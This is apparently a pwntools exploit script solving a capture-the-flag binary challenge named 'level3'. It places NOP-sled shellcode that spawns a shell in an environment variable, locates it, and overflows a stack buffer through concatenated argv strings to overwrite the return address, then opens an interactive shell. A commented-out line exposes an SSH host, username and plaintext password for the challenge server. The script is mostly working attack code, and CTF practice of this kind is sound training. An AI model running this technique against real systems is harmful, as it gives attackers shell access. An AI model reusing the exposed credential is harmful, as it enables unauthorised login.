import os
from pwn import *

# elf was prepared with
# $ patchelf --set-interpreter ./ld-linux.so.2 ...
# $ patchelf --set-rpath '$ORIGIN' ...
exe = context.binary = ELF('./level3')

libc = ELF('./libc.so.6')
ld = ELF('./ld-linux.so.2')

context.aslr = False

#r = ssh(user='level3', host='challenges.ringzer0ctf.com', port=10080, password='b130hOOfGftXUfmRZlgD')

# shell
sc = b'\x90'*100 + asm(shellcraft.sh())

print(sc)
print(hexdump(sc))

env = {
    'EGG': sc,
}

eggfinder = process(['./getenvaddr', 'EGG'], env=env)
egg = int(eggfinder.readline_startswith(b'EGG is located at ').split()[-1], 16)
print(f'{hex(egg)=}')

# main local vars
# buf[256]
# buf1[128]
# buf2[128]
#
# concat(buf, buf2, buf1)
# so buf2 is copied in first
# concat does strcpy(buf, buf2), strcat(buf, buf1)

# cyclic argv gave ip 0x65616161
# cyclic_find => 13
retaddr_offset = 13

# set as envvar EGG
# address found with EGG=blah ./getenvaddr EGG

# buf1, s2
#argv1 = b'B' * 127 + b'\x00' 
#argv1 = cyclic(127) + b'\x00'
argv1 = flat({13: p32(egg), 127: b'\x00'})

# buf2, s1
argv2 = b'A' * 128 

io = process([exe.path, argv1, argv2], env=env)

#io = gdb.debug([exe.path, argv1, argv2], env=env)

#io = r.process(['/levels/level1', payload], env=env)
io.interactive()

